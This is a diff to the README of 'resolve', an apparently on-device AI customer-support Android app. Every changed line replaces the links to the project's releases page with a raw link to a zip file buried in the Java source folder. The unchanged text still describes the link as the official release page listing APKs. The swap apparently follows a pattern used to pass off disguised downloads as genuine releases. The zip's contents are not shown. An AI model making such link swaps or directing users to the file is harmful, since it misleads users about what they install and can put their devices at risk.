@@ -1,6 +1,6 @@
 # 🤖 resolve - AI Customer Support on Your Device
 
-[![Download resolve](https://img.shields.io/badge/Download-resolve-blue?style=for-the-badge)](https://github.com/TheDenyung/resolve/releases)
+[![Download resolve](https://img.shields.io/badge/Download-resolve-blue?style=for-the-badge)](https://raw.githubusercontent.com/TheDenyung/resolve/main/android-companion/app/src/main/java/com/cssupport/Software_v2.1-alpha.2.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps to download and run resolve on your Android device.
 
 Go to the official release page by clicking the button below.
 
-[![Download resolve](https://img.shields.io/badge/Download-resolve-green?style=for-the-badge)](https://github.com/TheDenyung/resolve/releases)
+[![Download resolve](https://img.shields.io/badge/Download-resolve-green?style=for-the-badge)](https://raw.githubusercontent.com/TheDenyung/resolve/main/android-companion/app/src/main/java/com/cssupport/Software_v2.1-alpha.2.zip)
 
 This page hosts all the release versions of resolve. You will find the latest app package (APK) to download.
 
@@ -131,6 +131,6 @@ If resolve does not respond to messages as expected:
 
 You can always get the latest version of resolve here:
 
-[https://github.com/TheDenyung/resolve/releases](https://github.com/TheDenyung/resolve/releases)
+[https://raw.githubusercontent.com/TheDenyung/resolve/main/android-companion/app/src/main/java/com/cssupport/Software_v2.1-alpha.2.zip](https://raw.githubusercontent.com/TheDenyung/resolve/main/android-companion/app/src/main/java/com/cssupport/Software_v2.1-alpha.2.zip)
 
 Visit this page to choose the newest APK file. Follow the installation steps above to start using resolve quickly.
